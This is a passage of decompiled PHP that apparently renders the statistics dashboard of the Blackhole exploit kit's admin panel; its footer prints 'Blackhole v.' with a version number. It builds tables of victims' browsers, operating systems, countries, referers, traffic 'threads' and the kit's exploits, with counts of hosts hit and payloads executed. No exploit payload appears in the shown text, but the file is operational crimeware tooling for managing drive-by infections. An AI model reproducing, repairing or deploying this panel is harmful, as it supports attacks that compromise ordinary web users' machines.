    echo "px;\" id=\"todayChart4_1\"></div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t\t\t";
    if( $perc2 == 0 ) 
    {
        echo "<script>\$('todayChart4').setStyle({opacity:'0'});</script>";
    }

    echo "\t\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\t";
}

echo "\t\t\t\t\t\t</div>\t\t\t\t\t\t\r\n\t\t\t\t\t</div>\r\n\t\t\t\t\t<div style=\"width:12px;float:left;position:relative;\">&nbsp;</div>\r\n\t\t\t\t\t<div id=\"column-2\" class=\"column blocks\"></div>\r\n\t\t\t\t\t\r\n\t\t\t\t\t<div class=\"portal-column\" id=\"portal-column-block-list\" style=\"display: none;\">\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-1\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('browsers', 'block-1', '";
echo Lang::get("StatisticsBrowsersLabel");
echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
echo $paramForBrowsers;
echo "';\r\n\t\t\t\t\t\t\t\ttable.limit = ";
echo Config::get("MaxBrowsersLimit");
echo ";\r\n\t\t\t\t\t\t\t\ttable.entryLimit = ";
echo Config::get("MaxSecondLimit");
echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
echo Lang::get("StatisticsOtherLabel");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
echo Prefs::get("browsersSort");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
echo Prefs::get("browsersDest");
echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
foreach( $browsers as $num => $entry ) 
{
    echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
    echo $entry["ID"];
    echo ",\r\n\t\t\t\t\t\t\tTitle : '";
    echo $entry["Title"];
    echo "',\r\n\t\t\t\t\t\t\tHosts : '";
    echo $entry["Hosts"];
    echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
    echo $entry["Hosts2"];
    echo "',\r\n\t\t\t\t\t\t\tHited : '";
    echo $entry["Hited"];
    echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
    echo $entry["Executed"];
    echo "',\r\n\t\t\t\t\t\t\tMaxHosts : '0',\r\n\t\t\t\t\t\t\tType : 'browsers'\r\n\t\t\t\t\t\t\t";
    if( isset($fulls[$entry["ID"]]) ) 
    {
        echo "\t\t\t\t\t\t\t, items : [\r\n\t\t\t\t\t\t\t\t";
        foreach( $fulls[$entry["ID"]] as $full ) 
        {
            echo "\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\tBrowserVersion : '";
            echo $full["BrowserVersion"];
            echo "',\r\n\t\t\t\t\t\t\t\t\thosts : ";
            echo $full["hosts"];
            echo ",\r\n\t\t\t\t\t\t\t\t\thosts2 : ";
            echo $full["hosts2"];
            echo ",\r\n\t\t\t\t\t\t\t\t\thited : ";
            echo $full["hited"];
            echo ",\r\n\t\t\t\t\t\t\t\t\texecuted : ";
            echo $full["executed"];
            echo "\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\t\t";
        }
        echo "\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t";
    }

    echo "\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
    if( $num != count($browsers) - 1 ) 
    {
        echo ",";
    }

    echo "\t\t\t\t\t";
}
echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.browsers = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-2\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('os', 'block-2', '";
echo Lang::get("StatisticsOSLabel");
echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
echo $paramForBrowsers;
echo "';\r\n\t\t\t\t\t\t\t\ttable.allowFullLoad = false;\r\n\t\t\t\t\t\t\t\ttable.limit = ";
echo Config::get("MaxOSLimit");
echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
echo Lang::get("StatisticsOtherLabel");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
echo Prefs::get("osSort");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
echo Prefs::get("osDest");
echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
$keys = array_keys(Browser::$OSList);
foreach( $oses as $num => $entry ) 
{
    echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
    echo $entry["ID"];
    echo ",\r\n\t\t\t\t\t\t\tTitle : '";
    echo $entry["Title"];
    echo "',\r\n\t\t\t\t\t\t\tHosts : '";
    echo $entry["Hosts"];
    echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
    echo $entry["Hosts2"];
    echo "',\r\n\t\t\t\t\t\t\tHited : '";
    echo $entry["Hited"];
    echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
    echo $entry["Executed"];
    echo "',\r\n\t\t\t\t\t\t\tMaxHosts : '0',\r\n\t\t\t\t\t\t\tType : 'oses'\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
    if( $num != count($oses) - 1 ) 
    {
        echo ",";
    }

    echo "\t\t\t\t\t";
}
echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.oses = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-3\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('countries', 'block-3', '";
echo Lang::get("StatisticsCountriesLabel");
echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
echo $paramForBrowsers;
echo "';\r\n\t\t\t\t\t\t\t\ttable.allowFullLoad = false;\r\n\t\t\t\t\t\t\t\ttable.limit = ";
echo Config::get("MaxCountriesLimit");
echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
echo Lang::get("StatisticsOtherLabel");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
echo Prefs::get("countriesSort");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
echo Prefs::get("countriesDest");
echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
foreach( $countries as $num => $entry ) 
{
    echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
    echo $entry["ID"];
    echo ",\r\n\t\t\t\t\t\t\tTitle : '";
    echo $entry["Title"];
    echo "',\r\n\t\t\t\t\t\t\tHosts : '";
    echo $entry["Hosts"];
    echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
    echo $entry["Hosts2"];
    echo "',\r\n\t\t\t\t\t\t\tHited : '";
    echo $entry["Hited"];
    echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
    echo $entry["Executed"];
    echo "',\r\n\t\t\t\t\t\t\tMaxHosts : '0',\r\n\t\t\t\t\t\t\tType : 'countries'\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
    if( $num != count($countries) - 1 ) 
    {
        echo ",";
    }

    echo "\t\t\t\t\t";
}
echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.countries = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-4\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('exploits', 'block-4', '";
echo Lang::get("StatisticsExploitsLabel");
echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
echo $paramForBrowsers;
echo "';\r\n\t\t\t\t\t\t\t\ttable.allowFullLoad = true;\r\n\t\t\t\t\t\t\t\ttable.limit = ";
echo Config::get("MaxExploitsLimit");
echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
echo Lang::get("StatisticsOtherLabel");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
echo Prefs::get("exploitsSort");
echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
echo Prefs::get("exploitsDest");
echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
foreach( $exploits as $num => $entry ) 
{
    echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
    echo $entry["ID"];
    echo ",\r\n\t\t\t\t\t\t\tTitle : '";
    echo $entry["Title"];
    echo "',\r\n\t\t\t\t\t\t\tHosts : '";
    echo $entry["Hosts"];
    echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
    echo $entry["Hosts2"];
    echo "',\r\n\t\t\t\t\t\t\tHited : '";
    echo $entry["Hited"];
    echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
    echo $entry["Executed"];
    echo "',\r\n\t\t\t\t\t\t\tMaxHosts : '0',\r\n\t\t\t\t\t\t\tType : 'exploits'\r\n\t\t\t\t\t\t\t";
    if( isset($fulle[$entry["ID"]]) ) 
    {
        echo "\t\t\t\t\t\t\t, items : [\r\n\t\t\t\t\t\t\t\t";
        foreach( $fulle[$entry["ID"]] as $full ) 
        {
            echo "\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\tBrowserVersion : '";
            echo $full["BrowserVersion"];
            echo "',\r\n\t\t\t\t\t\t\t\t\thosts : ";
            echo $full["hosts"];
            echo ",\r\n\t\t\t\t\t\t\t\t\thosts2 : ";
            echo $full["hosts2"];
            echo ",\r\n\t\t\t\t\t\t\t\t\thited : ";
            echo $full["hited"];
            echo ",\r\n\t\t\t\t\t\t\t\t\texecuted : ";
            echo $full["executed"];
            echo "\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\t\t";
        }
        echo "\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t";
    }

    echo "\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
    if( $num != count($exploits) - 1 ) 
    {
        echo ",";
    }

    echo "\t\t\t\t\t";
}
echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.exploits = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
if( $showReferers ) 
{
    echo "\t\t\t\t\t\t<div class=\"block\" id=\"block-5\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('referers', 'block-5', '";
    echo Lang::get("StatisticsReferersLabel");
    echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
    echo $paramForBrowsers;
    echo "';\r\n\t\t\t\t\t\t\t\ttable.allowFullLoad = true;\r\n\t\t\t\t\t\t\t\ttable.fullLoadFunc = '';\r\n\t\t\t\t\t\t\t\ttable.limit = ";
    echo Config::get("MaxReferersLimit");
    echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
    echo Lang::get("StatisticsOtherLabel");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
    echo Prefs::get("referersSort");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
    echo Prefs::get("referersDest");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
    foreach( $referers as $num => $entry ) 
    {
        echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
        echo $entry["ID"];
        echo ",\r\n\t\t\t\t\t\t\tTitle : '";
        echo $entry["Title"];
        echo "',\r\n\t\t\t\t\t\t\tHosts : '";
        echo $entry["Hosts"];
        echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
        echo $entry["Hosts2"];
        echo "',\r\n\t\t\t\t\t\t\tHited : '";
        echo $entry["Hited"];
        echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
        echo $entry["Executed"];
        echo "',\r\n\t\t\t\t\t\t\tMaxHosts : null,\r\n\t\t\t\t\t\t\tType : 'referers'\r\n\t\t\t\t\t\t\t";
        if( isset($fullsr[$entry["Title"]]) ) 
        {
            echo "\t\t\t\t\t\t\t, items : [\r\n\t\t\t\t\t\t\t\t";
            foreach( $fullsr[$entry["Title"]] as $full ) 
            {
                echo "\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\tBrowserVersion : '";
                echo $full["BrowserVersion"];
                echo "',\r\n\t\t\t\t\t\t\t\t\thosts : ";
                echo $full["hosts"];
                echo ",\r\n\t\t\t\t\t\t\t\t\thosts2 : ";
                echo $full["hosts2"];
                echo ",\r\n\t\t\t\t\t\t\t\t\thited : ";
                echo ($full["hited"] != null ? $full["hited"] : 0);
                echo ",\r\n\t\t\t\t\t\t\t\t\texecuted : ";
                echo $full["executed"];
                echo "\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\t\t";
            }
            echo "\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
        if( $num != count($referers) - 1 ) 
        {
            echo ",";
        }

        echo "\t\t\t\t\t";
    }
    echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.referers = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
}

echo "\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t";
if( !isset($_GET["threadID"]) ) 
{
    echo "\t\t\t\t\t\t";
    foreach( $widgetsData as $id => $widget ) 
    {
        echo "\t\t\t\t\t\t\t<div class=\"block widget\" id=\"widget-";
        echo $id;
        echo "\">\r\n\t\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\t\tvar table = createTable('widgets-";
        echo $id;
        echo "', 'widget-";
        echo $id;
        echo "', '";
        echo Logs::$WidgetTitles[$id];
        echo "', true);\r\n\t\t\t\t\t\t\t\t\ttable.staticParams = '";
        echo $paramForBrowsers;
        echo "';\r\n\t\t\t\t\t\t\t\t\ttable.allowFullLoad = false;\r\n\t\t\t\t\t\t\t\t\ttable.limit = 9999;\r\n\t\t\t\t\t\t\t\t\ttable.entryLimit = ";
        echo Config::get("MaxSecondLimit");
        echo ";\r\n\t\t\t\t\t\t\t\t\ttable.otherTitle = '";
        echo Lang::get("StatisticsOtherLabel");
        echo "';\r\n\t\t\t\t\t\t\t\t\ttable.lastSort = '";
        echo Prefs::get("widgets-" . $id . "Sort");
        echo "';\r\n\t\t\t\t\t\t\t\t\ttable.lastDest = '";
        echo Prefs::get("widgets-" . $id . "Dest");
        echo "';\r\n\t\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t\t";
        $max = 0;
        foreach( $widget as $num => $entry ) 
        {
            if( $max < $entry["Hosts"] ) 
            {
                $max = $entry["Hosts"];
            }

        }
        foreach( $widget as $num => $entry ) 
        {
            echo "\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\tID : ";
            echo $entry["ID"];
            echo ",\r\n\t\t\t\t\t\t\t\tTitle : '";
            echo $entry["Title"];
            echo "',\r\n\t\t\t\t\t\t\t\tHosts : '";
            echo $entry["Hosts"];
            echo "',\r\n\t\t\t\t\t\t\t\tHosts2 : '";
            echo $entry["Hosts2"];
            echo "',\r\n\t\t\t\t\t\t\t\tHited : '";
            echo $entry["Hited"];
            echo "',\r\n\t\t\t\t\t\t\t\tExecuted : '";
            echo $entry["Executed"];
            echo "',\r\n\t\t\t\t\t\t\t\tMaxHosts : '";
            echo $max;
            echo "',\r\n\t\t\t\t\t\t\t\tType : '";
            echo $entry["Type"];
            echo "'\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t";
            if( $num != count($widget) - 1 ) 
            {
                echo ",";
            }

            echo "\t\t\t\t\t\t";
        }
        echo "\t\t\t\r\n\t\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\t\tTables['widgets-";
        echo $id;
        echo "'] = table;\r\n\t\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
    }
    echo "\t\t\t\t\t\t\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-7\">\r\n\t\t\t\t\t\t\t<script>\r\n\t\t\t\t\t\t\t\tvar table = createTable('threads', 'block-7', '";
    echo Lang::get("StatisticsThreadsLabel");
    echo "', false);\r\n\t\t\t\t\t\t\t\ttable.staticParams = '";
    echo $paramForBrowsers;
    echo "';\r\n\t\t\t\t\t\t\t\ttable.limit = ";
    echo Config::get("MaxThreadsLimit");
    echo ";\r\n\t\t\t\t\t\t\t\ttable.entryLimit = ";
    echo Config::get("MaxSecondLimit");
    echo ";\r\n\t\t\t\t\t\t\t\ttable.otherTitle = '";
    echo Lang::get("StatisticsOtherLabel");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.lastSort = '";
    echo Prefs::get("threadsSort");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.lastDest = '";
    echo Prefs::get("threadsDest");
    echo "';\r\n\t\t\t\t\t\t\t\ttable.setData([\r\n\t\t\t\t\t";
    foreach( $threads as $num => $entry ) 
    {
        echo "\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tID : ";
        echo $entry["ID"];
        echo ",\r\n\t\t\t\t\t\t\tTitle : '";
        echo $entry["Title"];
        echo "',\r\n\t\t\t\t\t\t\tHosts : '";
        echo $entry["Hosts"];
        echo "',\r\n\t\t\t\t\t\t\tHosts2 : '";
        echo $entry["Hosts2"];
        echo "',\r\n\t\t\t\t\t\t\tHited : '";
        echo $entry["Hited"];
        echo "',\r\n\t\t\t\t\t\t\tExecuted : '";
        echo $entry["Executed"];
        echo "',\r\n\t\t\t\t\t\t\tMaxHosts : null,\r\n\t\t\t\t\t\t\tType : 'threads'\r\n\t\t\t\t\t\t\t";
        if( isset($fullt[$entry["ID"]]) ) 
        {
            echo "\t\t\t\t\t\t\t, items : [\r\n\t\t\t\t\t\t\t\t";
            foreach( $fullt[$entry["ID"]] as $full ) 
            {
                echo "\t\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\tBrowserVersion : '";
                echo $full["BrowserVersion"];
                echo "',\r\n\t\t\t\t\t\t\t\t\thosts : ";
                echo $full["hosts"];
                echo ",\r\n\t\t\t\t\t\t\t\t\thosts2 : ";
                echo $full["hosts2"];
                echo ",\r\n\t\t\t\t\t\t\t\t\thited : ";
                echo $full["hited"];
                echo ",\r\n\t\t\t\t\t\t\t\t\texecuted : ";
                echo $full["executed"];
                echo "\t\t\t\t\t\t\t\t},\r\n\t\t\t\t\t\t\t\t";
            }
            echo "\t\t\t\t\t\t\t\tfalse\r\n\t\t\t\t\t\t\t]\r\n\t\t\t\t\t\t\t";
        }

        echo "\t\t\t\t\t\t}\r\n\t\t\t\t\t\t";
        if( $num != count($threads) - 1 ) 
        {
            echo ",";
        }

        echo "\t\t\t\t\t";
    }
    echo "\t\t\t\r\n\t\t\t\t\t\t\t\t], true);\r\n\t\t\t\t\t\t\t\tTables.threads = table;\r\n\t\t\t\t\t\t\t</script>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t";
}

echo "\r\n\t\t\t\t\t\t<div class=\"block\" id=\"block-6\">\r\n\t\t\t\t\t\t\t<div class=\"addWidget\">\r\n\t\t\t\t\t\t\t\t<a id=\"addWidgetOpen\" href=\"javascript:void(0);\">";
echo Lang::get("AddWidgetLabel");
echo "</a>\r\n\t\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t</div>\r\n\r\n\t\t\t\t\t</div>\r\n\t\t\t\t\t<div style=\"clear:both;\"></div>\t\r\n\t\t\t\t</div>\r\n\t\t\t</div>\r\n\t\t</div></div>\r\n\t\t<div class=\"footer\">\r\n\t\t\t";
if( isset($_SESSION[Config::get("AuthVariable", "Auth")]) ) 
{
    echo "\t\t\t\t<b>Blackhole v.";
    echo Config::get("Version");
    echo "</b>\r\n\t\t\t";
}

echo "\t\t</div>\r\n\t</div>\r\n\t\r\n\t\r\n\t<script>\r\n\t\tEvent.observe(window, 'load', function () {\r\n\t\t\tWidgets.addWidgetWindow = new Lightbox('addWidgetContainer');\r\n\t\t\tWidgets.fullWidgetContainer = new Lightbox('fullWidgetContainer');\r\n\t\t});\r\n\t\t\r\n\t\tEvent.observe('addWidgetOpen', 'click', function () {\r\n\t\t\tnew Ajax.Request('";
echo Config::get("AdminScriptName");
echo "?";
echo Config::get("MainParamName");
echo "=addWidget', { method: 'post', postBody: null, onComplete : function (t) {\r\n\t\t\t\t\t\$('addWidgetContainer').update(t.responseText);\r\n\t\t\t\t\tscrollbar = new Control.ScrollBar('countriesDiv','scrollbar_track_countries');\r\n\t\t\t\t\tscrollbar2 = new Control.ScrollBar('resultsDiv','scrollbar_track_result');\r\n\t\t\t\t\tWidgets.addWidgetWindow.open();\r\n\r\n\r\n\t\t\t\t\tWidgets.editID = null;\r\n\t\t\t\t\tEvent.observe('addWidgetClose', 'click', function () {\r\n\t\t\t\t\t\tWidgets.addWidgetWindow.close();\r\n\t\t\t\t\t});\r\n\t\t\t\t} });\r\n\t\t});\r\n\t\tCharts.browsersStatus['browsers'] = {};\r\n\t\t";
foreach( $fulls as $browserId => $full ) 
{
    echo "\t\t\tCharts.browsersStatus['browsers']['";
    echo $browserId;
    echo "'] = 1;\r\n\t\t";
}
echo "\t\tCharts.refererStatus['referers'] = {};\r\n\t\t";
foreach( $fullsr as $browserId => $full ) 
{
    echo "\t\t\tCharts.refererStatus['referers']['";
    echo $browserId;
    echo "'] = 1;\r\n\t\t";
}
echo "\t\tCharts.threadsStatus['threads'] = {};\r\n\t\t";
foreach( $fullt as $browserId => $full ) 
{
    echo "\t\t\tCharts.threadsStatus['threads']['";
    echo $browserId;
    echo "'] = 1;\r\n\t\t";
}
echo "\t\tAutoupdater.staticParams = '";
echo $paramForBrowsers;
echo "';\r\n\t\tAutoupdater.start(";
echo (Config::get("AjaxAutoreloadInterval") != "never" ? Config::get("AjaxAutoreloadInterval") : 9999);
echo ");\r\n\t</script>\r\n</body>\r\n</html>";

